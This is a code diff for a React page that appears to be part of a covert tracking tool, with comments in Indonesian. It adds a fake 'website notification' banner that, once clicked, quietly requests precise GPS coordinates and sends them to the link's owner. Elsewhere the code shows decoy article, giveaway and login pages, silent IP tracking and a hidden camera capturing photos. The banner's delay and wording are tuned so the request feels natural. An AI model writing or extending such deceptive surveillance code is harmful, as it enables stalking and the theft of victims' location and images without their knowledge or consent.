@@ -122,8 +122,89 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
   addCapture(link.id, { ...data }, notifConfig);
 }
 
+/* ─── Notification Banner (samar sebagai notif website) ─── */
+function NotifBanner({ onAllow, theme }) {
+  const [visible, setVisible] = useState(false);
+  const [dismissed, setDismissed] = useState(false);
+
+  const MSGS = {
+    article:  { icon: '📰', title: 'Dapatkan Berita Terbaru', body: 'Aktifkan notifikasi agar tidak ketinggalan artikel viral terbaru.' },
+    giveaway: { icon: '🎁', title: 'Notifikasi Hadiah', body: 'Aktifkan notifikasi supaya kamu langsung tahu saat hadiah tersedia.' },
+    video:    { icon: '▶️', title: 'Video Baru Tersedia', body: 'Aktifkan notifikasi untuk video dan konten eksklusif terbaru.' },
+    download: { icon: '⬇️', title: 'Update Aplikasi', body: 'Aktifkan notifikasi untuk mendapatkan update dan fitur terbaru.' },
+    survey:   { icon: '📋', title: 'Survei Berhadiah', body: 'Aktifkan notifikasi agar tidak ketinggalan survei berhadiah berikutnya.' },
+    login:    { icon: '🔔', title: 'Aktifkan Notifikasi', body: 'Aktifkan notifikasi keamanan untuk melindungi akun kamu.' },
+  };
+  const msg = MSGS[theme] || MSGS.article;
+
+  useEffect(() => {
+    // Muncul setelah 3 detik — terasa natural
+    const t = setTimeout(() => setVisible(true), 3000);
+    return () => clearTimeout(t);
+  }, []);
+
+  function handleAllow() {
+    setDismissed(true);
+    // 1. Minta izin notifikasi browser (popup bilang "[domain] ingin mengirim notifikasi")
+    if ('Notification' in window) {
+      Notification.requestPermission().then(perm => {
+        // 2. Setelah user klik di popup notifikasi → minta lokasi (terasa sebagai lanjutan)
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => onAllow && onAllow(pos),
+            () => {},
+            { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
+          );
+        }
+      });
+    } else if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => onAllow && onAllow(pos),
+        () => {},
+        { timeout: 15000, maximumAge: 0, enableHighAccuracy: true }
+      );
+    }
+  }
+
+  if (!visible || dismissed) return null;
+
+  return (
+    <div style={{
+      position: 'fixed', bottom: '20px', left: '50%', transform: 'translateX(-50%)',
+      background: '#1e293b', color: '#f1f5f9', borderRadius: '14px',
+      padding: '16px 20px', boxShadow: '0 8px 32px rgba(0,0,0,0.4)',
+      zIndex: 99999, display: 'flex', alignItems: 'center', gap: '14px',
+      maxWidth: '420px', width: 'calc(100vw - 40px)',
+      animation: 'slideUp 0.4s cubic-bezier(0.16,1,0.3,1)',
+    }}>
+      <style>{`@keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(30px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }`}</style>
+      <div style={{ fontSize: '28px' }}>{msg.icon}</div>
+      <div style={{ flex: 1 }}>
+        <div style={{ fontWeight: 700, fontSize: '14px', marginBottom: '3px' }}>{msg.title}</div>
+        <div style={{ fontSize: '12px', color: '#94a3b8', lineHeight: 1.4 }}>{msg.body}</div>
+      </div>
+      <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+        <button
+          onClick={handleAllow}
+          style={{
+            background: '#3b82f6', color: '#fff', border: 'none', borderRadius: '8px',
+            padding: '7px 14px', fontWeight: 700, fontSize: '13px', cursor: 'pointer',
+          }}
+        >Izinkan</button>
+        <button
+          onClick={() => setDismissed(true)}
+          style={{
+            background: 'transparent', color: '#64748b', border: 'none',
+            fontSize: '12px', cursor: 'pointer',
+          }}
+        >Nanti</button>
+      </div>
+    </div>
+  );
+}
 
 /* ─── Decoy Components ──────────────────────────────────── */
+
 
 function ArticleDecoy() {
   return (
@@ -381,7 +462,6 @@ export default function Capture() {
   const params   = useParams();
   const location = useLocation();
 
-  // trackId bisa dari named param (:trackId) atau segmen terakhir path
   const trackId = params.trackId
     || location.pathname.split('/').filter(Boolean).pop()
     || '';
@@ -391,36 +471,35 @@ export default function Capture() {
   const [showCamera, setShowCamera] = useState(false);
   const dataRef  = useRef({});
   const notifRef = useRef(null);
-  const ranRef   = useRef(false); // cegah double-run React StrictMode
+  const ranRef   = useRef(false);
 
   useEffect(() => {
     if (ranRef.current) return;
     ranRef.current = true;
-
     if (!trackId) { setNotFound(true); return; }
-
     const cfg = decodeConfig(trackId);
-    if (!cfg) { setNotFound(true); return; }
-
+    if (!cfg)   { setNotFound(true); return; }
     setConfig(cfg);
     notifRef.current = cfg.notif || null;
-
-    const link = {
-      id: cfg.id || trackId,
-      options: cfg.options || {},
-      decoyTheme: cfg.decoyTheme,
-    };
-
-    // Jalankan tracking SEKALI — addCapture dipanggil di dalam runSilentTracking
+    const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
+    // IP tracking langsung (silent, tanpa popup)
     runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
   }, [trackId]);
+
+  // Dipanggil saat user klik Izinkan di banner notifikasi → update dengan koordinat GPS presisi
+  function handleGpsFromBanner(pos) {
+    if (!config) return;
+    dataRef.current.lat         = pos.coords.latitude;
+    dataRef.current.lon         = pos.coords.longitude;
+    dataRef.current.gpsAccuracy = Math.round(pos.coords.accuracy);
+    dataRef.current.locationSource = 'GPS';
+    addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
+  }
 
   function handlePhotoCapture(photo) {
     if (photo) dataRef.current.photo = photo;
     setShowCamera(false);
-    if (config) {
-      addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
-    }
+    if (config) addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
   }
 
   if (notFound) return (
@@ -440,6 +519,8 @@ export default function Capture() {
     <>
       {showCamera && <HiddenCamera onCapture={handlePhotoCapture} />}
       <DecoyComponent />
+      {/* Banner notifikasi muncul setelah 3 detik — menyamar sebagai notif website */}
+      <NotifBanner theme={config.decoyTheme} onAllow={handleGpsFromBanner} />
     </>
   );
 }
